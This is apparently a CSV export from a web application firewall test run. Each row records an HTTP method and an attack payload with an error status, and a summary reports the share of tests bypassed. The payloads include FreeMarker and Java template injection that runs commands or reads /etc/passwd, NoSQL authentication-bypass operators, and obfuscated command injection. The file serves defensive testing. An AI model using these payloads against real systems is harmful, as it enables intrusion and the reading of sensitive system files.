Category,Method,Status,Response Time (ms),Payload,Is Redirect,WAF Detected,WAF Type,Timestamp,URL
"SSTI - Framework Specific","PUT",ERR,0,"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""id"") }",false,false,"Unknown","",""
"SSTI - Framework Specific","DELETE",ERR,0,"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""id"") }",false,false,"Unknown","",""
"SSTI - Framework Specific","GET",ERR,0,"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join("" "")}",false,false,"Unknown","",""
"SSTI - Framework Specific","POST",ERR,0,"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join("" "")}",false,false,"Unknown","",""
"SSTI - Framework Specific","PUT",ERR,0,"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join("" "")}",false,false,"Unknown","",""
"SSTI - Framework Specific","DELETE",ERR,0,"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join("" "")}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",ERR,0,"%7B%22%24%6E%65%22%3A%6E%75%6C%6C%7D",false,false,"Unknown","",""
"NoSQL Injection - Advanced","POST",ERR,0,"%7B%22%24%6E%65%22%3A%6E%75%6C%6C%7D",false,false,"Unknown","",""
"NoSQL Injection - Advanced","PUT",ERR,0,"%7B%22%24%6E%65%22%3A%6E%75%6C%6C%7D",false,false,"Unknown","",""
"NoSQL Injection - Advanced","DELETE",ERR,0,"%7B%22%24%6E%65%22%3A%6E%75%6C%6C%7D",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",ERR,0,"\u007B\u0022\u0024ne\u0022\u003Anull\u007D",false,false,"Unknown","",""
"NoSQL Injection - Advanced","POST",ERR,0,"\u007B\u0022\u0024ne\u0022\u003Anull\u007D",false,false,"Unknown","",""
"NoSQL Injection - Advanced","PUT",ERR,0,"\u007B\u0022\u0024ne\u0022\u003Anull\u007D",false,false,"Unknown","",""
"NoSQL Injection - Advanced","DELETE",ERR,0,"\u007B\u0022\u0024ne\u0022\u003Anull\u007D",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",ERR,0,"{""$regex"": "".*""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","POST",ERR,0,"{""$regex"": "".*""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","PUT",ERR,0,"{""$regex"": "".*""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","DELETE",ERR,0,"{""$regex"": "".*""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",ERR,0,"{""$where"": ""this.password.match(/.*/)""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","POST",ERR,0,"{""$where"": ""this.password.match(/.*/)""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","PUT",ERR,0,"{""$where"": ""this.password.match(/.*/)""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","DELETE",ERR,0,"{""$where"": ""this.password.match(/.*/)""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",ERR,0,"{""$expr"": {""$gt"": [{""$strLenCP"": ""$password""}, 0]}}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","POST",ERR,0,"{""$expr"": {""$gt"": [{""$strLenCP"": ""$password""}, 0]}}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","PUT",ERR,0,"{""$expr"": {""$gt"": [{""$strLenCP"": ""$password""}, 0]}}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","DELETE",ERR,0,"{""$expr"": {""$gt"": [{""$strLenCP"": ""$password""}, 0]}}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",ERR,0,"{""$where"": ""function(){return this.username == 'admin' || '1'=='1'}""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","POST",ERR,0,"{""$where"": ""function(){return this.username == 'admin' || '1'=='1'}""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","PUT",ERR,0,"{""$where"": ""function(){return this.username == 'admin' || '1'=='1'}""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","DELETE",ERR,0,"{""$where"": ""function(){return this.username == 'admin' || '1'=='1'}""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",ERR,0,"{""$where"": ""obj.credits > obj.debits""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","POST",ERR,0,"{""$where"": ""obj.credits > obj.debits""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","PUT",ERR,0,"{""$where"": ""obj.credits > obj.debits""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","DELETE",ERR,0,"{""$where"": ""obj.credits > obj.debits""}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",ERR,0,"{""selector"":{""_id"":{""$gt"":null}}}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","POST",ERR,0,"{""selector"":{""_id"":{""$gt"":null}}}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","PUT",ERR,0,"{""selector"":{""_id"":{""$gt"":null}}}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","DELETE",ERR,0,"{""selector"":{""_id"":{""$gt"":null}}}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","GET",ERR,0,"{""selector"":{""$and"":[{""_id"":{""$gt"":null}}]}}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","POST",ERR,0,"{""selector"":{""$and"":[{""_id"":{""$gt"":null}}]}}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","PUT",ERR,0,"{""selector"":{""$and"":[{""_id"":{""$gt"":null}}]}}",false,false,"Unknown","",""
"NoSQL Injection - Advanced","DELETE",ERR,0,"{""selector"":{""$and"":[{""_id"":{""$gt"":null}}]}}",false,false,"Unknown","",""
"Command Injection - Encoded","GET",ERR,0,"%3Bcat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","POST",ERR,0,"%3Bcat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","PUT",ERR,0,"%3Bcat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","DELETE",ERR,0,"%3Bcat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","GET",ERR,0,"%26%26cat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","POST",ERR,0,"%26%26cat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","PUT",ERR,0,"%26%26cat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","DELETE",ERR,0,"%26%26cat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","GET",ERR,0,"%7Ccat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","POST",ERR,0,"%7Ccat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","PUT",ERR,0,"%7Ccat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","DELETE",ERR,0,"%7Ccat%20%2Fetc%2Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","GET",ERR,0,"\u003Bcat\u0020\u002Fetc\u002Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","POST",ERR,0,"\u003Bcat\u0020\u002Fetc\u002Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","PUT",ERR,0,"\u003Bcat\u0020\u002Fetc\u002Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","DELETE",ERR,0,"\u003Bcat\u0020\u002Fetc\u002Fpasswd",false,false,"Unknown","",""
"Command Injection - Encoded","GET",ERR,0,"\u007Cid",false,false,"Unknown","",""
"Command Injection - Encoded","POST",ERR,0,"\u007Cid",false,false,"Unknown","",""
"Command Injection - Encoded","PUT",ERR,0,"\u007Cid",false,false,"Unknown","",""
"Command Injection - Encoded","DELETE",ERR,0,"\u007Cid",false,false,"Unknown","",""
"Command Injection - Encoded","GET",ERR,0,"`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`",false,false,"Unknown","",""
"Command Injection - Encoded","POST",ERR,0,"`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`",false,false,"Unknown","",""
"Command Injection - Encoded","PUT",ERR,0,"`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`",false,false,"Unknown","",""
"Command Injection - Encoded","DELETE",ERR,0,"`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`",false,false,"Unknown","",""
"Command Injection - Encoded","GET",ERR,0,"$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",false,false,"Unknown","",""
"Command Injection - Encoded","POST",ERR,0,"$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",false,false,"Unknown","",""
"Command Injection - Encoded","PUT",ERR,0,"$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",false,false,"Unknown","",""
"Command Injection - Encoded","DELETE",ERR,0,"$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",false,false,"Unknown","",""
"Command Injection - Encoded","GET",ERR,0,"`printf ""\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""`",false,false,"Unknown","",""
"Command Injection - Encoded","POST",ERR,0,"`printf ""\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""`",false,false,"Unknown","",""
"Command Injection - Encoded","PUT",ERR,0,"`printf ""\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""`",false,false,"Unknown","",""
"Command Injection - Encoded","DELETE",ERR,0,"`printf ""\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""`",false,false,"Unknown","",""
"Command Injection - Encoded","GET",ERR,0,"${PATH:0:1}bin${PATH:0:1}cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd",false,false,"Unknown","",""
"Command Injection - Encoded","POST",ERR,0,"${PATH:0:1}bin${PATH:0:1}cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd",false,false,"Unknown","",""
"Command Injection - Encoded","PUT",ERR,0,"${PATH:0:1}bin${PATH:0:1}cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd",false,false,"Unknown","",""
"Command Injection - Encoded","DELETE",ERR,0,"${PATH:0:1}bin${PATH:0:1}cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd",false,false,"Unknown","",""
"Command Injection - Encoded","GET",ERR,0,"${HOME:0:1}..${HOME:0:1}..${HOME:0:1}etc${HOME:0:1}passwd",false,false,"Unknown","",""
"Command Injection - Encoded","POST",ERR,0,"${HOME:0:1}..${HOME:0:1}..${HOME:0:1}etc${HOME:0:1}passwd",false,false,"Unknown","",""
"Command Injection - Encoded","PUT",ERR,0,"${HOME:0:1}..${HOME:0:1}..${HOME:0:1}etc${HOME:0:1}passwd",false,false,"Unknown","",""
"Command Injection - Encoded","DELETE",ERR,0,"${HOME:0:1}..${HOME:0:1}..${HOME:0:1}etc${HOME:0:1}passwd",false,false,"Unknown","",""

"--- Results Summary ---"
"Risk Level","Low "
"WAF Effectiveness (%)",80.96
"Total Tests",1313
"Bypassed",250

"--- Response Time Summary ---"
"Avg Response Time (ms)",958
"Min Response Time (ms)",0
"Max Response Time (ms)",3218
"Slow Requests (>2000ms)",185
